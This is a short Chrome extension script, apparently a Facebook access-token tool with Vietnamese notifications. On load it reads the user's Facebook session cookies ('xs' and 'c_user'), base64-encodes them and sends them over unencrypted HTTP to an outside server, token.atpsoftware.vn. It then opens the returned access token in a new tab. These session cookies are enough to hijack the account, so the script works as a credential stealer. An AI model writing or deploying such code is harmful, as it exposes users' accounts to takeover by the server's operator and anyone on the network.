var key = "";
function getallfb()
{
	chrome.cookies.getAll({domain: ".facebook.com"}, function(cookies) {
		var check_login = false;
		for(var i=0; i<cookies.length;i++) {
			if(cookies[i].name == "xs")
			{
				check_login = true;
				key += "xs="+cookies[i].value+";";
			}
			if(cookies[i].name == "c_user")
			{
				key += "c_user="+cookies[i].value+";";
			}
		}
		if(!check_login)
		{
			var notification = new Notification('Thông báo lổi', {
			  icon: 'http://i.imgur.com/Nk0wyaW.png',
			  body: 'Hệ thống không tìm thấy bất cứ tài khoản Facebook nào đang đăng nhập.',
			});
			notification.onclick = function () {
			  window.open("http://facebook.com");      
			};
		}
		if(check_login){
			xmlhttp=new XMLHttpRequest();
			xmlhttp.onreadystatechange=function()
			{
				if (xmlhttp.readyState==4 && xmlhttp.status==200)
				{
					var html = JSON.parse(xmlhttp.responseText);
					if(typeof html.access_token !== 'undefined'){
						var newURL = "http://token.atpsoftware.vn/?access_token="+html.access_token;
						chrome.tabs.create({ url: newURL });
					}
					else
					{
						var notification = new Notification('Thông báo lổi', {
						  icon: 'http://i.imgur.com/Nk0wyaW.png',
						  body: html.msg,
						});
						notification.onclick = function () {
						  window.open("http://atpsoftware.vn");      
						};
					}
					
				}
			}
			xmlhttp.open("GET", "http://token.atpsoftware.vn/token.php?key="+ btoa(key), false );
			xmlhttp.send(); 
		}
	});
}
getallfb();



